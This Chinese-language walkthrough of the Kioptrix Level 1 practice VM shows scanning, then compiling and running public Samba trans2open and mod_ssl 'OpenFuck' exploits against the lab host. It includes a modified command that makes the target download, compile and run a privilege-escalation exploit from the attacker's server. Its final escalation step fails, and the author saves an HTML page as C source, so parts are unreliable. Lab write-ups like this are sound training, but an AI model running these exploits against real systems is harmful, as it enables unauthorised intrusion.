---
description: 是一个虚拟靶机，用于进行渗透测试和漏洞攻击的实践。它是Kioptrix系列中的第一个关卡，为初学者提供了一个学习和实践渗透测试的环境。
---

# KIOPTRIX: LEVEL 1 (#1)

### 主机发现

首先需要发现目标IP地址，我这台靶机是VMware的打开的用了桥接模式，我这里使用arp-scan发现主机

```
┌──(root㉿kali)-[~]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:f5:d6:36, IPv4: 192.168.43.24
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.43.1    9e:7b:7e:db:9c:66       (Unknown: locally administered)
192.168.43.175  70:32:17:c7:c0:63       Intel Corporate
192.168.43.222  00:0c:29:df:b1:1f       VMware, Inc.
192.168.43.250  00:0c:29:33:c8:07       VMware, Inc.

7 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.190 seconds (116.89 hosts/sec). 4 responded
```

除去已知的IP设备，"192.168.43.222 "这个地址是目标IP

### 目标探测

使用Nmap探测目标开放端口

```
┌──(root㉿kali)-[~]
└─# nmap -sC -sV -A 192.168.43.222
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-12 23:14 EDT
Nmap scan report for 192.168.43.222
Host is up (0.0040s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1024/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2023-06-13T03:16:58+00:00; +2m00s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:DF:B1:1F (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
```

开放的端口和服务：

* 22/tcp：开放的SSH端口，运行OpenSSH 2.9p2，支持SSHv1协议。
* 80/tcp：开放的HTTP端口，运行Apache httpd 1.3.20，可能是Red Hat Linux发行版，使用mod\_ssl/2.8.4和OpenSSL/0.9.6b。
* 111/tcp：开放的RPC绑定端口，运行版本为2的RPC服务。
* 139/tcp：开放的NetBIOS-SSN端口，运行Samba smbd服务，工作组为MYGROUP。
* 443/tcp：开放的HTTPS端口，运行Apache/1.3.20，可能是Red Hat Linux发行版，使用mod\_ssl/2.8.4和OpenSSL/0.9.6b。
* 1024/tcp：开放的状态服务端口，RPC服务。

### 初步利用

139开放端口是Samba的一个服务，没有显示版本，有点可疑，使用msf模块扫描一下它的版本

<details>

<summary>Samba 是一个开源软件套件，用于在 Linux 和其他类 Unix 系统上实现 SMB/CIFS 协议。它允许 Linux/Unix 系统与 Windows 系统之间进行文件和打印机共享，使得不同操作系统的计算机能够方便地共享文件和资源。通过 Samba，您可以设置共享文件夹和打印机，让 Windows 用户可以访问并与其进行文件交互。它还提供用户认证和授权功能，以确保只有经过授权的用户可以访问共享资源。Samba 的目的是提供跨平台的互操作性和集成性，使得不同操作系统之间的文件共享和通信更加便捷。</summary>



</details>

```
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set rhosts 192.168.43.222
rhosts => 192.168.43.222
msf6 auxiliary(scanner/smb/smb_version) > run
[*] 192.168.43.222:139    - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.43.222:139    -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.43.222:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

根据上面的结果发现服务的版本是 Samba 2.2.1a

<pre><code>┌──(root㉿kali)-[~]
└─# searchsploit Samba 2.2.1a
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
Samba 2.2.0 &#x3C; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                | osx/remote/9924.rb
S<a data-footnote-ref href="#user-content-fn-1">amba &#x3C; 2.2.8 (Linux/BSD) - Remote Code Execution </a>                          | multiple/remote/10.c
Samba &#x3C; 3.0.20 - Remote Heap Overflow                                       | linux/remote/7701.txt
Samba &#x3C; 3.6.2 (x86) - Denial of Service (PoC)                               | linux_x86/dos/36741.py
---------------------------------------------------------------------------- ---------------------------------
</code></pre>

通过searchsploit发现Samba这个版本服务存在一个RCE漏洞，将multiple/remote/10.c文件保存并用gcc编译它

```
┌──(root㉿kali)-[~/Desktop/test]
└─# searchsploit -m multiple/remote/10.c
  Exploit: Samba < 2.2.8 (Linux/BSD) - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/10
     Path: /usr/share/exploitdb/exploits/multiple/remote/10.c
    Codes: OSVDB-4469, CVE-2003-0201
 Verified: True
File Type: C source, ASCII text
Copied to: /root/Desktop/test/10.c
                                                                                                            
┌──(root㉿kali)-[~/Desktop/test]
└─# gcc 10.c -o Samba
```

编译好了就可以对目标进行攻击

```
┌──(root㉿kali)-[~/Desktop/test]
└─# ./Samba -b0 -v 192.168.43.222
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Verbose mode.
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Using ret: [0xbffffed4]
+ Using ret: [0xbffffda8]
+ Using ret: [0xbffffc7c]
+ Using ret: [0xbffffb50]
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
```

这里是拿到了一个root的权限

### 进一步枚举

使用nkito扫描一下

```
nikto -host 192.168.43.222 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.43.222
+ Target Hostname:    192.168.43.222
+ Target Port:        80
+ Start Time:         2023-06-13 02:28:57 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Apache is vulnerable to XSS via the Expect header. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918
+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
+ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system.
+ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835
+ /manual/: Directory indexing found.
+ /manual/: Web server manual found.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /test.php: This might be interesting.
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8908 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2023-06-13 02:29:51 (GMT-4) (54 seconds)

```

根据扫描结果，目标 mod\_ssl/2.8.4 - mod\_ssl 2.8.7 可能存在缓冲区溢出，远程代码执行漏洞，通过searchexploit 发现有漏洞利用脚本

<pre><code>┌──(root㉿kali)-[~]
└─# searchsploit mod_ssl 2.8.4          
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
Apache mod_ssl &#x3C; 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow        | unix/remote/21671.c
Apache mod_ssl &#x3C; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)  | unix/remote/764.c
<a data-footnote-ref href="#user-content-fn-2">Apache mod_ssl &#x3C; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)</a>  | unix/remote/47080.c
---------------------------------------------------------------------------- ---------------------------------
</code></pre>

将该文件复制到当前目录

```
┌──(root㉿kali)-[~/Desktop/test]
└─# searchsploit -m unix/remote/47080.c 
  Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
      URL: https://www.exploit-db.com/exploits/47080
     Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
    Codes: CVE-2002-0082, OSVDB-857
 Verified: False
File Type: C source, ASCII text
Copied to: /root/Desktop/test/47080.c
```

gcc 编译该脚本

```
┌──(root㉿kali)-[~/Desktop/test]
└─# gcc -o 47080 47080.c -lcrypto 
```

编译好之后就可以攻击目标了

```
┌──(root㉿kali)-[~/Desktop/test]
└─# ./47080 0x6b 192.168.43.222 -c 40

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
--04:53:22--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!

Unable to establish SSL connection.

Unable to establish SSL connection.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c': No such file or directory
bash: ./exploit: No such file or directory
bash-2.05$ 
bash-2.05$ whoami
whoami
apache
```

这里获得的是一个普通用的权限的一个shell，我们的目标是root，根据上面返回的信息cannot remove \`ptrace-kmod.c': No such file or directory提示没有找到这个文件路径并给出了文件名，ptrace-kmod.c，查看一下源文件发现有一段有关的源码

```
#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmod.c; ./exploit; \n"
```

目标主机无法从目标网站下载这个文件，我们将它下载到kali机器上面并开启一个python的http服务

{% embed url="https://github.com/piyush-saurabh/exploits" %}

```
┌──(root㉿kali)-[~/Desktop/test/KIOPTRIX:LEVEL1]
└─# wget https://github.com/piyush-saurabh/exploits/blob/master/ptrace-kmod.c                 
--2023-06-16 03:31:44--  https://github.com/piyush-saurabh/exploits/blob/master/ptrace-kmod.c
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘ptrace-kmod.c’

ptrace-kmod.c                                                  [    <=>                                                                                                                                  ] 197.31K   292KB/s    in 0.7s    

2023-06-16 03:31:47 (292 KB/s) - ‘ptrace-kmod.c’ saved [202044]
                                                                                                                                                                                                                                          
┌──(root㉿kali)-[~/Desktop/test/KIOPTRIX:LEVEL1]
└─# python3 -m http.server 3333
Serving HTTP on 0.0.0.0 port 3333 (http://0.0.0.0:3333/) ...


```

```
#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmod.c; ./exploit; \n"
将上面这段源码改成,把它默认的地址改成我们自己的下载地址
#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://192.168.43.24:3333/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmod.c; ./exploit; \n"
```

重新编译一下攻击exp文件

<pre><code><strong>┌──(root㉿kali)-[~/Desktop/test/KIOPTRIX:LEVEL1]
</strong>└─# gcc -o exploit 47080.c -lcrypto

┌──(root㉿kali)-[~/Desktop/test/KIOPTRIX:LEVEL1]
└─# ./exploit 0x6b 192.168.43.222 443 -c 50

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 50 of 50
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8068
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmod.c; ./exploit; -kmod.c 
--05:53:47--  http://192.168.43.24:8888/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to 192.168.43.24:8888... connected!
HTTP request sent, awaiting response... 200 OK
Length: 202,044 [text/x-csrc]

    0K .......... .......... .......... .......... .......... 25% @   2.57 MB/s
   50K .......... .......... .......... .......... .......... 50% @   1.95 MB/s
  100K .......... .......... .......... .......... .......... 76% @   1.36 MB/s
  150K .......... .......... .......... .......... .......   100% @   2.72 MB/s

05:53:47 (1.99 MB/s) - `ptrace-kmod.c' saved [202044/202044]

ptrace-kmod.c:571:10: missing terminating ' character
ptrace-kmod.c:1402:8: missing terminating ' character
ptrace-kmod.c:1412:16: missing terminating ' character
ptrace-kmod.c:2315:12: missing terminating ' character
gcc: file path prefix `/usr/bin' never used
bash: ./exploit: No such file or directory
bash-2.05$ 
bash-2.05$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-2.05$
</code></pre>

这里并没有成功，但是看别人是拿到了root

{% embed url="https://www.c0dedead.io/kioptrix-level-1-walkthrough-part-1-mod_ssl/" %}









[^1]: 

[^2]: 
